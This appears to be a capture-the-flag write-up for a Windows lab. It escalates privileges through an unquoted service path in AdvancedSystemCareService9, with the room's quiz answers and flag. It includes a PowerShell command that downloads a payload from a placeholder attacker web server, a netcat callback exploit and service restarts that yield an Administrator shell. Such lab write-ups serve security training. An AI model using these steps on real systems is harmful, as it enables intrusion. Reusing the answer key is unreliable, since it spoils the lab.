[Privilege Escalation]

[*] Target: 10.10.187.179

    [+] PowerUp.ps1 is designed to automate the process of finding common Windows privilege escalation vulnerabilities

    [+] It helps identify misconfigurations and weak configurations that can be leveraged to gain higher privileges on a compromised system

    [+] The script performs various checks and scans the system for potential vulnerabilities, providing valuable information for further exploitation.

    [+] Some of the key features and capabilities of PowerUp.ps1 include:

        [1] Service misconfigurations: It checks for misconfigured services that may allow an attacker to escalate privileges.

        [2] Registry-based vulnerabilities: It searches for insecure registry settings that can be exploited to gain elevated privileges.

        [3] Token-based vulnerabilities: It identifies weak or insecure user tokens that could potentially be leveraged for privilege escalation.

        [4] File system permissions: It looks for insecure file and folder permissions that may allow unauthorized access or privilege escalation.

        [5] Scheduled tasks: It identifies scheduled tasks with weak or misconfigured permissions that can be abused for privilege escalation.

        [6] Unquoted service paths: It detects services whose executable paths contain spaces without proper quotation, which can lead to privilege escalation.

[Question 1] What is the name of the service which shows up as an unquoted service path vulnerability? => AdvancedSystemCareService9

[Question 2] What is the root flag? => 9af5f314f57607c00fd09803a587db80

[Access and Escalation Without Metasploit]

    [+] Run the exploit twice (https://www.exploit-db.com/exploits/39161). 
    
    [+] The first run will pull the netcat binary to the target system, and the second run will execute the payload to establish a callback.

    [+] Once you have run winPEAS (just a tool like PowerUp), you will see that it points out unquoted paths and provides the name of the service running with an unquoted path vulnerability.

    [+] To manually find out the service name, run the following PowerShell command:

        >>> powershell -c "Get-Service"

        [>>] Now, let's escalate to Administrator by generating your payload using msfvenom and pulling it to the target system using PowerShell. 

            >>> powershell -c "Invoke-WebRequest -Uri 'http://yourwebserver/payload.exe' -OutFile 'C:\path\to\payload.exe'"

        [+] Move the payload to the unquoted directory mentioned by winPEAS and restart the service with the following two commands:

            >>> sc stop AdvancedSystemCareService9
            
            >>> sc start AdvancedSystemCareService9

    [+] After running the second command, you should see a shell opened as Administrator on your listener.

[Question 1] *Format is "powershell -c "command here"* => powershell -c "Get-Service"
